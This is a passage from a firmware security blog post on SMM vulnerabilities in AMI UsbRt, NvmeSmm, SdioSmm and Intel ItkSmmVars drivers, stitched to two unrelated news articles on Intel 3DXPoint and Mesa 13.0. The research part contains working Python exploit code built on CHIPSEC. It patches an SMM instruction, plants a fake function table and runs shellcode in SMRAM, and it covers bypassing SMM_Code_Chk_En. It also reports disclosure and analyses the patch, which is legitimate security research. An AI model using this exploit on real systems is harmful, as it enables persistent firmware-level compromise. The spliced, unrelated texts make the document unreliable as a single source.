    VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    VOID *v4; // rbx@1

    byte_8B701FF0 = 1;
    v4 = (VOID *)*(_DWORD *)(*(unsigned int *)0x40E * 0x10 + 0x104);

    if (sub_8B701B08((unsigned __int64)v4, 103) < 0 || *(_BYTE *)v4 >= 4)
    {
        *((_BYTE *)v4 + 2) = 7;
    }
    else
    {
        off_8B700818[(unsigned __int64)*(_BYTE *)v4](v4);
    }

    return 0;
}
 Function table at 0x8B00818 used in this SW SMI handler is significantly smaller than function tables used in the sub_8B716E40() and sub_8B6EC888(), but at its end we can see the same statement that allows attacker to overwrite almost any SMRAM location with 0x07 byte. So, now we have a three vulnerable drivers from AMI which have security flaws similar in their nature, but a bit different in details (other constant values, offsets, etc.). The fact that described drivers are using abstractions from legacy BIOS era allows us to assume, that discovered vulnerabilities exist for quite a long time, most likely since the days when AMI decided to switch their software from legacy BIOS code base to EFI one. To confirm that vulnerabilities are not OEM or product specific and UsbRt, NvmeSmm or SdioSmm drivers with the same security flaws are also present in other firmwares — I decided to find such firmwares in products from OEM’s different than Intel. Luckily, one of my friends shared with me UEFI capsule with the firmware update verion 0801 from his Asus Q170M-C motherboard where I was able to find two of these drivers: UsbRt and NvmeSmm. It’s very cool that in such trivial way I was able to find a several industry wide vulnerabilities that might be present in a lot of computer models with firmware from AMI. To my taste, these vulnerabilities are more interesting from practical perspective than ThinkPwn because they're actually vulnerabilities of SW SMI handlers that can be called over 0xB2 I/O port. In case of ThinkPwn we have a single vulnerability that requires your own implementation of Communicate() function from DXE protocol EFI_SMM_BASE_PROTOCOL to exploit it from running operating system, such limitation isn’t nice simply because implementation of the Communicate() will be model specific and probably even BIOS version specific (actually, that’s why I decided to release my ThinkPwn PoC exploit as UEFI application — it can use existing DXE protocols not available during runtime phase to communicate with vulnerable SMI handler). What other interesting SW SMI handlers can we check as high priority targets based on some metainformation that we have at this point? From the output of smram_parse.py utility we can notice that it was able to find numerous SW SMI handlers located in three different drivers which use SMM protocol called EFI_SMM_CPU_PROTOCOL. This protocol allows SMM drivers to read and write saved CPU state area located in SMRAM where CPU saves the values of its registers before jumping to SMI entry. With its help SMM driver may receive attacker controlled input for some SMI handler via CPU registers, so, SW SMI handlers of NvramSmi, NbSmm and ItkSmmVars drivers definitely look promising. Among these three SW SMI handlers I was able to find one vulnerable handler registered with codes 0x44 and 0xEF, this handler belongs to SMM driver called ItkSmmVars: int __fastcall sub_2D98(__int64 a1, __int64 a2, __int64 a3, __int64 a4)

 This SW SMI handler receives some structure pointer controlled by attacker in RSI register and does read and write operations with the structure fields without any checks of its address. In the listing shown above significant part of function code was skipped to make it more readable, but at its end you can see switch-case block that allows to write words with constant values at attacker controllable location. Exploitation of such vulnerability is similar to three other vulnerabilities of NUC firmware described in this article, there’s only one difference — SW SMI handler of ItkSmmVars driver likely has no code related to legacy BIOS stuff such as locating of EBDA address. As for the ItkSmmVars itself — based on its name, this driver likely belongs to the framework called Intel Integrator's Kit. Documentation for this framework can be found in public, here’s the short description of its purpose: Intel Integrator Toolkit allows customization of system BIOS settings and is intended for use only by professional PC system integrators. Incorrect system BIOS settings may cause a system to malfunction, fail to boot, or operate with decreased performance. Incorrect BIOS settings may affect system stability and functionality. It sounds weird, but it seems that Intel doesn’t know how to write proper UEFI SMM drivers for firmwares of their own computers. I guess now you can imagine how horrible might be the code from other OEM and IBV companies in the world where even platform vendor itself can produce such ridiculously silly vulnerabilities. Vulnerability exploitation in real conditions When I've found fourth vulnerability that gives exploitation primitive similar to previous three — I decided to stop my ongoing analysis of other SW SMI handlers code and try to achieve arbitrary SMM code execution with one of vulnerabilities that were already known at this point. Because of SMM_Code_Chk_En security feature it’s possible to execute only the code located inside SMRAM region defined by SMRR registers, so, before shellcode execution we have to copy it into SMRAM somehow. It can’t be achieved with our exploitation primitives directly because they only allow to write a several different constant values. However, we can do this by corrupting SMM code or data to turn our limited exploitation primitive into a more powerful one that allows to overwrite arbitrary memory location with arbitrary data: Vulnerable SW SMI handlers of AMI drivers which were shown in previous parts of the article have similar code that uses statically initialized array of pointers to call some child functions by their numbers. Normally, these arrays are located inside SMRAM, but we can use our exploitation primitive to corrupt second argument of MOV or LEA machine instruction of SMM driver that moves address of the array into the register. After this we will have a patched machine instruction that uses address of array located in attacker controlled memory instead of original one. Attacker can put there his fake array with entries which point to ROP gadgets instead of original functions and trigger execution of patched SMM code using SW SMI. Properly selected ROP gadgets can copy arbitrary values at arbitrary memory addresses or do any other useful things. To implement this idea I decided to check the code of UsbRt SMM driver to find the address of proper machine instruction that will be convenient to patch, but accidentally I discovered a much more elegant way to exploit our vulnerabilities. Here you can see the code of sub_8B6EDF38() function that can be called from the previously shown sub_8B6EC888(). Address of the sub_8B6EDF38() is located in previously listed array off_8B6EBDF0 at index 15: int __fastcall sub_8B6EDF38(VOID *SomeStruct)
{
    VOID *v1; // rbx@1
    __int64 v2; // rax@1

    v1 = SomeStruct;

    //
    // This function calls other child function by their index in the
    // off_8B6EBF28 array with caller specified arguments.
    //
    v2 = sub_8B6EDDD0(
        off_8B6EBF28[(unsigned __int64)*(_BYTE *)(SomeStruct + 1)],
        *(_QWORD **)(SomeStruct + 3),
        (*(_DWORD *)(SomeStruct+ 0xB) + 3) & 0xFFFFFFFC
    );

    // report status
    *(_BYTE *)(v1 + 2) = 0;
    *(_QWORD *)(v1 + 0xF) = v2;

    return v2;
}
 This function gets some value at attacker controlled index from other array off_8B6EBF28 and passes it into the sub_8B6EDD0() as first argument. Second and third arguments of the sub_8B6EDD0() can be directly controlled by attacker, this function contains the most interesting code that allows us to do some wonderful things: int __fastcall sub_8B6EDDD0(VOID *Func, VOID **Args, unsigned int ArgsLen)

    unsigned __int64 v3; // rax@1
    signed __int64 v4; // rax@2

        }
    }
    else

    return result;
}
 As you can see, sub_8B6EDF38() and sub_8B6EDD0() altogether provide legit mechanism to call any function present in off_8B6EBF28 array with any amount of fully controlled arguments between 0 and 7. This unbelievably awesome gift from AMI devs allows attacker to not mess with any ROP chains and other complicated things. With proper patching of the sub_8B6EDF38() code it will be possible to call almost any function that exists inside of any loaded SMM drivers in absolutely natural way! For example, attacker can execute memcpy() to deliver his code into SMRAM or, even better, he can implement the whole payload logic outside of SMRAM and use patched sub_8B6EDF38() to call needed functions of existing SMM protocols. It will allow us to do pretty much everything that might be needed to do in SMM without having our own code that runs in SMM. Let’s check assembly code of sub_8B6EDF38() function that we’re going to patch: seg000:000000008B6EDF38                sub_8B6EDF38    proc near

 LEA instruction at address 0x8B6E7F4D is copying the address of array into the RAX register, it has machine code 48 8D 05 D4 DF FF FF. Using vulnerability in SW SMI handler of NvmeSmm driver we can turn its code into the 48 8D 05 07 07 07 FF, so, patched instruction will use second argument with value 0x8B6E7F4D + 0xFF070707 + 7 == 0x8A75E65B instead of original 0x8B6EBF28. At physical address 0x8A75E65B (located outside of SMRAM obviously) attacker needs to allocate a fake array with, for example, memcpy() address. Then it will be possible to use SW SMI handler of patched UsbRt driver to call memcpy() function (located inside SMRAM obviously) with arbitrary arguments by its address that was fetched from fake array. I made an explainable picture where you can see visual representation of UsbRt driver execution flow starting from sub_8B6EDF38() function before and after its patching: Reliability of this exploitation scenario depends on two addresses that must be hardcoded into the exploit code for each possible combination of computer model and firmware version: Physical address of LEA instruction of UsbRt SMM driver to patch. Physical address of memcpy() function located inside any loaded SMM driver. Such situation is still far away from perfect, the exploit code will not work on computer with firmware version previously unknown to the attacker. However, in case of exploitation with ROP gadgets which were described previously we’ll need to hardcode even larger amount of version/model specific constants. If you have any ideas how to make the exploit more reliable and easy portable — feel free to post some comments, pull requests or contact me over e-mail. Now its time to write some code. As usual, I decided to implement this PoC on the top of CHIPSEC framework API. Here’s the code that initializes CHIPSEC as library and provides more convenient wrapper for needed chipsec.hal classes: import sys, os, random
from struct import pack, unpack
from hexdump import hexdump

SMRAM_SIZE = 0x400000
SMRAM_ADDR = 0x8B400000

align_up = lambda a, b: a + (b - (a % b))

class Chipsec(object):

    def __init__(self):

        import chipsec.chipset
        import chipsec.hal.physmem
        import chipsec.hal.interrupts

        # initialize CHIPSEC
        self.cs = chipsec.chipset.cs()
        self.cs.init(None, True)

        # get instances of required classes
        self.mem = chipsec.hal.physmem.Memory(self.cs)
        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)

    # CHIPSEC has no physical memory read/write methods for quad words
    def read_physical_mem_qword(self, addr):

        return unpack('Q', self.mem.read_physical_mem(addr, 8))[0]

    def write_physical_mem_qword(self, addr, val):

        self.mem.write_physical_mem(addr, 8, pack('Q', val))

    def mem_alloc(self, data, size = None):

        if not isinstance(data, basestring):

            size = data
            data = None

        if size is None:

            size = align_up(len(data), 0x100)

        _, addr = self.mem.alloc_physical_mem(size)
        self.mem.write_physical_mem(addr, size, '\0' * size)

        if data is not None:

            self.mem.write_physical_mem(addr, len(data), data)

        return addr
 To write 0x07 value into arbitrary physical memory location I decided to use NvmeSmm driver vulnerability, here’s the function that performs its exploitation (to overwrite second argument of LEA instruction we are going to call it three times for the three different bytes): # NvmeSmm SW SMI handler number
NVME_SMI_NUM = 0x42

def overwrite_with_0x07(addr):

    addr -= 2

    # backup memory contents
    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)

    # overwrite EBDA word
    cs.mem.write_physical_mem_word(EBDA_ADDR, 0)

    addr_1 = (0 << 4) + 0x0104
    val_1 = cs.mem.read_physical_mem_dword(addr_1)

    # write pointer value
    cs.mem.write_physical_mem_dword(addr_1, addr)

    print('Trigerring SW SMI 0x%x to overwrite byte at 0x%x with 7...' % \
          (NVME_SMI_NUM, addr + 2))

    # fire SMI
    cs.ints.send_SW_SMI(0, NVME_SMI_NUM, 0, 0, 0, 0, 0, 0, 0)

    # restore overwritten memory
    cs.mem.write_physical_mem_dword(addr_1, val_1)
    cs.mem.write_physical_mem_word(EBDA_ADDR, val_0)
 Now let’s write main part of exploit code that overwrites LEA instruction argument, allocates fake functions array and fires patched SW SMI handler of UsbRt driver to execute caller specified SMM function with needed arguments: EBDA_ADDR = 0x040E

# UsbRt SW SMI handler number
USBRT_SMI_NUM = 0x31

# what BIOS version to exploit
BIOS_VER = 0

BIOS_VERSIONS = [

    # version name           address of memcpy()   address of instruction to patch
    ( 'SYSKLi35.86A.0045',   0x8B702110,           0x8B6EDF4D )
]

BIOS_VER, MEMCPY_ADDR, PATCH_INSN_ADDR = BIOS_VERSIONS[BIOS_VER]

PATCH_INSN_LEN = 7

def smm_call(func_addr, func_args = None):

    FUNC_TABLE = PATCH_INSN_ADDR + PATCH_INSN_LEN - (0xFFFFFFFF - 0xFF070707 + 1)
    FUNC_TABLE_SIZE = 7

    # internal function numbers for UsbRt SW SMI handler
    USBRT_PROC = 0x2E
    USBRT_SUB_PROC = 0x00

    args = [] if func_args is None else func_args
    args_addr = 0x00000500
    args_len = len(args)

    print('Target "lea reg, func_table" instruction to patch is at 0x%.8x' % \
          PATCH_INSN_ADDR)

    # patch function table offset from 0xFFFFxxxx to 0xFF070707
    overwrite_with_0x07(PATCH_INSN_ADDR + 3)
    overwrite_with_0x07(PATCH_INSN_ADDR + 4)
    overwrite_with_0x07(PATCH_INSN_ADDR + 5)

    # backup memory contents
    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)
    val_1 = cs.mem.read_physical_mem(FUNC_TABLE, 8 * FUNC_TABLE_SIZE)
    val_2 = cs.mem.read_physical_mem(args_addr, 8 * args_len)

    # SMM handler communication structure with input data
    data = pack('=BBBQIQ', USBRT_PROC, USBRT_SUB_PROC, 0xFF, args_addr, 8 * args_len, 0)

    addr_1 = (0x10 << 4) + 0x0104
    data_1 = cs.mem.read_physical_mem_dword(addr_1)

    addr_2 = 0x00000300
    data_2 = cs.mem.read_physical_mem(addr_2, 0x20)

    print('%d function arguments are at 0x%.8x' % (args_len, args_addr))
    print('Fake functions table address is 0x%.8x' % FUNC_TABLE)
    print('SMM communication buffer address is at 0x%.8x' % addr_1)
    print('SMM communication buffer is at 0x%.8x' % addr_2)

    # write usb communication strucutre
    cs.mem.write_physical_mem(addr_2, len(data_2), '\0' * len(data_2))
    cs.mem.write_physical_mem(addr_2, len(data), data)

    # write usb communication strucutre address
    cs.mem.write_physical_mem_dword(addr_1, addr_2)

    # write function arguments
    for i in range(0, len(args)):

        cs.write_physical_mem_qword(args_addr + (8 * i), args[i])

    # write fake functions table
    for i in range(0, FUNC_TABLE_SIZE):

        cs.write_physical_mem_qword(FUNC_TABLE + (8 * i), func_addr)

    # overwrite EBDA word
    cs.mem.write_physical_mem_word(EBDA_ADDR, 0x10)

    print('Triggering SW SMI 0x%x...' % USBRT_SMI_NUM)

    # fire SMI
    cs.ints.send_SW_SMI(0, USBRT_SMI_NUM, 0, 0, 0, 0, 0, 0, 0)

    # check for status code returned by SW SMI handler
    val_3 = cs.mem.read_physical_mem_byte(addr_2 + 3)
    val_4 = cs.read_physical_mem_qword(addr_2 + 0xf)

    cs.mem.write_physical_mem_word(EBDA_ADDR, val_0)

    print('SUCESS: SMM function 0x%.8x was called' % func_addr)

    return val_4
 Now we can use smm_call() function to implement other useful payloads and primitives. For example, here’s the function that executes caller specified machine code in System Management Mode: smm_memcpy = lambda src, dst, size: smm_call(MEMCPY_ADDR, [ src, dst, size ])

def execute_shellcode(code, args):

    addr = SMRAM_ADDR + 0x1000
    code = ''.join(code) if isinstance(code, list) else code

    # align shellcode size by 0x100
    size = align_up(len(code), 0x100)
    code = code + '\0' * (size - len(code))

    # allocate temporary destination buffer for memcpy() call
    _, buff_addr = cs.mem.alloc_physical_mem(size)
    cs.mem.write_physical_mem(buff_addr, size, code)

    print('Copying %d bytes of the shellcode from 0x%.8x to 0x%.8x' % \
          (size, buff_addr, addr))

    # copy shellcode into SMRAM
    smm_memcpy(addr, buff_addr, size)

    print('Executing shellcode...')

    # call the shellcode
    return smm_call(addr, args)
 To make my Aptiocalypsis exploit a bit more useful as standalone firmware reverse engineering tool, I wrote some code that allows to dump physical memory contents. Here’s how to use it from command line: # python aptiocalypsis.py [<dump_address> <dump_size> [dest_file_path]] When it was started without command line, it checks whether it’s possible to exploit NvmeSmm driver vulnerability on current platform. In other case it dumps specified region of physical memory into the file or prints its hexadecimal dump into the stdout if dest_file_path argument was not specified. Using aptiocalypsys.py to dump whole SMRAM contents into the file: Having fun with Aptiocalypsis exploit. As you can see — the code works just fine. It was tested on several 6-th generation Intel NUCs with firmware version SYSKLi35.86A.0045 from 27.05.2016 (latest one at that moment). To port this exploit to any other vulnerable firmware from AMI you have to perform reverse engineering process explained in this article and add constants for your firmware version into BIOS_VERSIONS array. Aptiocalypsis exploit is the first publicly demonstrated successful attempt of breaking SMM_Code_Chk_En security feature and I need to admit that it was easy. However, I believe that it still might be useful to mitigate some other vulnerabilities, in general this security feature looks pretty sane and there’s no excuses for the firmware developers not to have its support in their products. Also, it will be interesting to know about existence of other computers that use SMM_Code_Chk_En, so, any information related to this question is welcome. Patch analysis As it was said at the beginning of the article — to try something new I decided to do responsible disclosure of four AMI and ItkSmmVars 0day vulnerabilities to Intel. Why Intel? Well, for me it’s more convenient to have a single communication point with this industry, and the platform vendor looks like the best available option so far. I sent my reports to Intel Platform Security and Incident Response Team at 15.07.2016 and after several working days and short e-mail conversation both Intel and AMI confirmed all of the security issues. Intel decided to release a single advisory INTEL-SA-00057 to cover all four vulnerabilities. Fixed firmware for my NUC of version SYSKLi35.86A.0051 was released at 10.08.2016 — not bad, especially as for the job that requires coordinated work of two different companies. So, let’s download patched firmware (I took more recent SYSKLi35.86A.0052 released at 10.09.2016) and check the code of, for example, UsbRt driver SW SMI handler: __int64 __cdecl sub_1B34(EFI_HANDLE DispatchHandle, VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    __int64 v4; // rbx@1
    VOID *SomeStruct; // rdi@1
    unsigned __int8 v6; // al@7

    v4 = qword_177E8;
    SomeStruct = *(VOID **)(qword_177E8 + 0x6D78);

    if (SomeStruct)
    {
        *(_QWORD *)(qword_177E8 + 0x6D78) = 0;
    }
    else
    {
        if (*(_BYTE *)(qword_177E8 + 8) & 0x10)
        {
            return 0;
        }

        // get pointer to the attacker controlled structure
        SomeStruct = (VOID *)*(_DWORD *)(*(unsigned int *)0x40E * 0x10 + 0x104);

        //
        // Check if it points into the SMRAM, this function call is actually
        // new one that was added in the most recent version.
        //
        if (sub_17268(SomeStruct, 0x44) < 0)
        {
            // structure address points into the SMRAM, exit
            return 0;
        }

        *(_BYTE *)(qword_177E8 + 0x71B0) = 1;
    }

    if (!SomeStruct)
    {
        return 0;
    }

    // read byte form the beginning of the structure
    v6 = *SomeStruct;
    if (!*SomeStruct)
    {
        goto LABEL_11;
    }

    // some checks to prevent array index overrun
    if (v6 >= 0x20 && v6 <= 0x38)
    {
        v6 -= 0x1F;

LABEL_11:

        //
        // Use readed byte as index to call child function which
        // address is stored in array.
        //
        off_DF0[(unsigned __int64)v6](vSomeStruct, &off_DF0, CommBuffer, CommBufferSize);
        v4 = qword_177E8;
    }

    if (!*(_QWORD *)(v4 + 0x6D78))
    {
        *(_BYTE *)(v4 + 0x71B0) = 0;
    }

    return 0;
}
 As you can see, now this function has a new call to the sub_17268() which is obviously used to verify structure pointer obtained from attacker controllable memory location. Here’s the sub_17268() code, it accepts memory address as first argument and its size as second. From function control flow we can suggest that it checks whether specified memory range overlaps any known SMRAM location: signed __int64 __cdecl sub_17268(void *Address, void *Size)
{
    unsigned __int64 v2; // r8@1
    signed __int64 result; // rax@2
    unsigned __int64 v4; // rbx@3
    EFI_SMRAM_DESCRIPTOR *v5; // r10@6
    unsigned __int64 v6; // rdx@7

    v2 = 0;

    if (SmramDescriptorCount)
    {
        v4 = Size + Address;

        if (Size + Address >= Address)
        {
            if (SmramDescriptorCount <= 0)
            {
LABEL_12:
                // ok, specified memory location is allowed
                result = 0;
            }
            else
            {
                v5 = SmramDescriptor;

                // enumerate available SMRAM descriptors
                while (1)
                {
                    v6 = v5->PhysicalSize;

                    // verify buffer address against this SMRAM region
                    if (Address < v5->PhysicalStart)
                    {
                        goto LABEL_17;
                    }

                    if (Address < v6 + v5->CpuStart)
                    {
                        break;
                    }

                    if (Address < v6 )
                    {
LABEL_17:
                        if (v4 > v6)
                        {
                            break;
                        }
                    }

                    // go to the next SMRAM descriptor
                    ++v2;
                    ++v5;

                    if (v2 >= SmramDescriptorCount)
                    {
                        // last descriptor reached
                        goto LABEL_12;
                    }
                }

                result = 0x800000000000000F;
            }
        }
        else
        {
            result = 0x8000000000000002;
        }
    }
    else
    {
        result = 0x800000000000000E;
    }

    return result;
}
 Function sub_17268() uses array of standard EFI_SMRAM_DESCRIPTOR structures with the information about SMRAM regions stored in global variable off_17798 (I renamed it to SmramDescriptor). Other global variable off_177A0 (SmramDescriptorCount correspondingly) contains total number of known SMRAM regions. Here’s SMRAM descriptor structure definition from public EFI header files: //
// Structure describing a SMRAM region and its accessibility attributes.
//
typedef struct
{
    //
    // Designates the physical address of the SMRAM in memory. This view of memory is
    // the same as seen by I/O-based agents, for example, but it may not be the address seen
    // by the processors.
    //
    EFI_PHYSICAL_ADDRESS  PhysicalStart;

    //
    // Designates the address of the SMRAM, as seen by software executing on the
    // processors. This address may or may not match PhysicalStart.
    //
    EFI_PHYSICAL_ADDRESS  CpuStart;

    //
    // Describes the number of bytes in the SMRAM region.
    //
    UINT64                PhysicalSize;

    //
    // Describes the accessibility attributes of the SMRAM.  These attributes include the
    // hardware state (e.g., Open/Closed/Locked), capability (e.g., cacheable), logical
    // allocation (e.g., allocated), and pre-use initialization (e.g., needs testing/ECC
    // initialization).
    //
    UINT64                RegionState;

} EFI_SMRAM_DESCRIPTOR;
 Function sub_17268() is also being called form other locations of UsbRt driver, it seems that AMI uses it to filter attacker controllable pointers in many of child functions that might be called from SW SMI handler code: References to memory validation function. Function sub_FFC() that runs upon SMM driver load (its call is located near the driver entry point) is responsible for initialization of SMRAM regions information needed by the sub_17268(). It obtains this information in a pretty usual way: by calling GetCapabilities() function of the EFI_SMM_ACCESS2_PROTOCOL defined in UEFI specs. Array of EFI_SMRAM_DESCRIPTOR structures itself is located in System Management Mode pool allocated with SmmAllocatePool() function of the EFI_SMM_SYSTEM_TABLE2: int __fastcall sub_FFC(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)

 Other patched drivers of the new Intel NUC firmware, NvmeSmm, SdioSmm and even ItkSmmVars have absolutely the same code to verify attacker controllable pointers against known SMRAM regions, it seems that Intel and AMI had worked on this patch together. How good is this patch? Well, it depends on what do you mean under "good". It prevents arbitrary System Management Mode code execution, so, attacker will not be able to elevate his privileges from ring 0 to ring -2 (SMM) on patched firmware versions. However, security of UEFI SMM drivers from platform firmware can affect security mechanisms of operating system that runs on this platform. In "Exploiting SMM callout vulnerabilities in Lenovo firmware" article I’ve told that SMM vulnerabilities might be used to break Windows 10 Enterprise security feature called Credential Guard — it protects domain credentials stored in the RAM even when attacker managed to get full privileges (ring 3 + ring 0 code execution) on target host. Credential Guard is implemented on the top of other Windows 10 feature called Virtual Secure Mode (VSM). VSM works as protected virtual machine (aka secure world) that runs on the top of the Hyper-V separately from host Windows 10 system and its kernel (aka normal world). VSM has its own isolated kernel mode and user mode, on Credential Guard enabled systems part of Local Security Subsystem Service (LSASS) is responsible for keeping domain credentials running as isolated user mode process inside VSM. Obviously, UEFI SMM drivers have no any clue about the hypervisor: validation of attacker controlled pointers in fixed versions of Intel and AMI drivers prohibits overwriting of SMRAM region only, so, attacker still can write various constant values into the memory that belongs to the Hyper-V. It might be used for escaping from normal world to secure world and breaking Windows Credential Guard and others VSM powered security features. There’s a great whitepaper "Analysis of the attack surface of Windows 10 virtualization based security" by Rafal Wojtczuk, check it out for more detailed information about attacks on Credential Guard. It’s also necessary to clarify that described attack can’t be performed from regular virtualized guest domains of the Hyper-V because they prohibit access to 0xB2 I/O port that is needed to fire vulnerable SW SMI handlers. Writing proper security fixes for broken UEFI SMM drivers is actually more complicated than it looks, I hope that Intel and AMI will find some way to make UsbRt, NvmeSmm, SdioSmm and ItkSmmVars code more secure to prevent bypassing Windows 10 Virtual Secure Mode. For example, it’s possible to use buffers with preallocated physical addresses for SW SMI handlers input, or move these buffers below first megabyte of physical memory space. Source code of Aptiocalipsys exploit is available on its GitHub repository, at this moment it seems that Intel is the only one OEM company which released advisory and fixes for these vulnerabilities. Probably, in some future we’ll see information about vulnerable products from other vendors.

Quietly Delays 3DXPoint Memory Modules Intel's next server processors won't support 3DXPoint memory modules. Ashraf Eassa (TMFChipFool) Oct 22, 2016 at 11:22AM Image source: Intel.  For quite a while, chip giant Intel (NASDAQ:INTC) has been talking up a next-generation non-volatile memory technology known as 3DXPoint. The technology is billed as an entirely new class of memory -- faster and more durable than traditional NAND flash memory while much cheaper than DRAM. At Intel's 2015 investor meeting, the company claimed that the total addressable market, or TAM, for 3DXPoint memory modules (that is, 3DXPoint being used as a substitute for DRAM rather than as a substitute for NAND flash as part of a storage drive) could be worth approximately $34 billion by 2020. Intel had previously said that these 3DXPoint memory modules would be supported on a "future Intel Xeon processor." Based on the leaks around Intel's upcoming Purley server platform, it was expected that the future processor that Intel was talking about was Skylake-EP, a product that's slated to launch in the first half of 2017. However, on Intel's most recent earnings call, CEO Brian Krzanich indicated that this wouldn't be the case. 3DXPoint memory modules only for second-gen Purley Whenever Intel releases a server platform, it usually supports that same basic platform for two processor generations. It usually takes anywhere from a year to a year and a half for Intel to come out with new processor generations, so in practice one can expect an Intel server platform to remain current for about three years before being replaced. With that in mind, it's worth looking at what Krzanich had to say about Purley and 3DXPoint memory module support (transcript from Seeking Alpha): On the Purley platform we're actually starting to sample those products already to some of the leading-edge customers. And they're seeing not only just an overall TCO performance advantage that we typically see with each one of these but this also continues our integration of things like the omni-path fabric, it has more integration of the silicon photonics so it's still the adjacency functions that are quite strong, and they will get more and better as we go through each one of these. There will be a second generation of Purley that includes 3DXPoint. According to this, the "future Xeon processor" that will support 3DXPoint memory modules will not be the upcoming Skylake-EP, but instead its successor, known as Cannonlake-EP. When will Intel start selling these 3DXPoint memory modules? If Intel's upcoming 3DXPoint memory modules require Cannonlake-EP to work, then investors should realistically expect that Intel won't be selling those modules until either late 2018 or in the first half of 2019. I'd be pleasantly surprised if it were the former, as I'm expecting the latter. This suggests that any revenue contribution from these memory modules on Intel's part probably won't be seen until that time. What does this mean for investors? At the end of the day, Intel's data-center group brings in most of its revenue from the sale of processors and related chipset components, which Intel refers to as "platform" products. Last quarter, just over 8% of its data-center revenue came from non-platform products. The best way to think of technologies like 3DXPoint memory modules, silicon photonics, and these other non-platform products that Intel talks about is as "nice to have" technologies. Obviously, investors should welcome every last bit of profitable revenue growth with open arms, but the core of the business has been and will continue to be sales of platform components. If the platforms continue to do well, Intel's overall data-center business should do well -- robust non-platform sales in this case would serve as a cherry on top. If platform sales disappoint, then it's unlikely that any growth from the non-platform components, like 3DXPoint memory modules, will generate enough revenue to ultimately matter.

Features You Will Not Find In The Mesa 13.0 Release Written by Michael Larabel in Mesa on 22 October 2016 at 09:20 AM EDT. 16 Comments While Mesa 13.0 is coming along for release next month with exciting features like OpenGL 4.5 for Intel, unofficial GL 4.4/4.5 for RadeonSI/NVC0, and the addition of the RADV Radeon Vulkan driver, there is some functionality that sadly won't be found in this release. Below are some features/functionality not currently found in Mesa 13.0. Some of the mentioned items have patches floating on the mailing list that weren't merged in time while other items are more along the lines of pipe-dreams that would have been fun to see in Mesa for 2016. These items aren't meant to criticize Mesa development but rather show there is still much work to be done in the open-source graphics space so while the drivers may be hitting OpenGL 4.5, there is still a lot left and to make these drivers more competitive with Windows/proprietary drivers. Plus if you are looking to improve the situation, Mesa could always use more assistance from independent developers with an array of contributions. Even if you aren't a developer, you can help Mesa development by testing the latest code and reporting bugs. OpenGL 4.0/4.1 For Haswell - While there have been FP64 patches floating around for months to support Intel Haswell hardware with GL4 so it can advance beyond GL 3.3, they were not merged for Mesa 13.0. It's a big set of patches but once this ARB_gpu_shader_fp64 support for Haswell lands, these older Intel graphics processors will be able to expose OpenGL 4.1 compliance. Nouveau Vulkan - Intel has a Vulkan driver since Mesa 12.0 and Mesa 13.0 adds the RADV community-based (unofficial) Radeon Vulkan Linux driver. Unfortunately, there is no NVIDIA Vulkan open-source driver, which would have to come through the Nouveau camp. Nouveau developers said at XDC2016 to not expect a Nouveau Vulkan driver anytime soon considering their resources are stretched as is and there are more important Nouveau tasks to work on. Thus for the foreseeable future NVIDIA GPU owners will be left to the NVIDIA proprietary driver for Vulkan support. Official OpenGL 4.5 Support For RadeonSI / NVC0 - While the Nouveau NVC0 and RadeonSI drivers expose all needed extensions for OpenGL 4.4 and 4.5, they only still advertise "OpenGL 4.3" via their version string. This is due to passing the conformance tests set out by Khronos with GL 4.4/4.5. There is a path to conformance for open-source drivers with Khronos, but Nouveau hasn't yet tackled it (some of their developers have also expressed concern over Nouveau having no formal organizational structure for pursuing official compliance) while an AMD developer clarified about RadeonSI conformance, "'Some bugs' is actually still a relatively big number for radeonsi (and nouveau is probably worse, since some of its most prolific contributors can't even test against the CTS). We're making good progress on radeonsi, but there's no guarantee that it'll happen before the final 13.0 release, and I don't want us to rush things. Don't worry, you'll have OpenGL 4.5 on Mesa master soon enough, and you can always set an environment variable override." OpenGL Multi-Threading - Some modern games require proper multi-threading in the OpenGL driver for good performance, such as Witcher 2. Unfortunately there hasn't been too much work on better multi-threading of Mesa/Gallium3D drivers. The only work that comes to mind was some earlier work done by Intel but nothing too fancy and haven't seen any work in the Gallium3D space. Vulkan Drivers Faster Than The OpenGL Drivers - The RADV Vulkan driver is slower than RadeonSI OpenGL, which isn't too much of a surprise given its limited development resources and not being in development as long as other Vulkan drivers. However, the Intel ANV Vulkan driver is slower than the GL driver (that's also the case for Haswell on GL / Vulkan). It looks like the Intel Vulkan driver just needs more time to mature too. It's not just the game/renderer to blame as the proprietary NVIDIA/AMD stacks have shown Vulkan can be faster than OpenGL with the same games while having less CPU overhead. On-Disk Shader Cache - There's been patches for an on-disk GLSL shader cache to speed up game loading times going back many months. The work has been centered around the Intel i965 driver and unfortunately this shader cache hasn't yet landed in Mesa Git. We also haven't seen any public shader cache work for RadeonSI or NVC0 yet. Some prep work landed in Mesa in September for the shader cache, but unfortunately it's not all buttoned up yet. The shader cache will be a big win for game loading times on supported Mesa drivers. AZDO / Driver Overhead - More work is still needed for making Mesa drivers support "Approaching Zero Driver Overhead" techniques. Some extensions are supported but other extensions like ARB_indirect_parameters, ARB_bindless_texture, ARB_sparse_texture, and many other extensions are not yet supported by Mesa or only by a subset of the drivers. OpenGL 2015 / 2016 Extensions - Related to the previous AZDO comment, there still are a ton of ARB/EXT extensions post-4.5 OpenGL that have yet to be implemented by Mesa drivers. You can see all of the red via the bottom of MesaMatrix.net. Not all of the extensions are necessarily useful but a good number of them are important. There are also a number of OpenGL ES 3.1/3.2 extensions yet to be completed by the Radeon or Nouveau drivers. LLVMpipe OpenGL 4 - While LLVMpipe is about the best open-source OpenGL software rasterizer implementation, it's still living in a OpenGL 3.3 world. There's been barely any work on implementing OpenGL 4.x extensions along the software code-paths for LLVMpipe. Then again, LLVMpipe is mostly used just as software fallbacks on composited desktops and debugging by developers as a vendor-neutral driver code-path to test against. GLSL Memory Allocation Rework / Faster Compilation - Marek has recently been working on using Jemalloc in Mesa and improving the GLSL compiler performance. Unfortunately this work didn't land for Mesa 13.0 but Marek did mention on the mailing list he is looking at merging some of his GLSL compiler improvement patches into Git this weekend. If you want to help Mesa developers and get started in open-source driver development, see some past resources about getting started with Mesa and different easy projects to gain experience. If you could have all of your Mesa dreams answered - realistic or not - what would they be? What do you like best about Mesa 13? Which of these items do you hope will be reasonably scratched off for the next Mesa release?

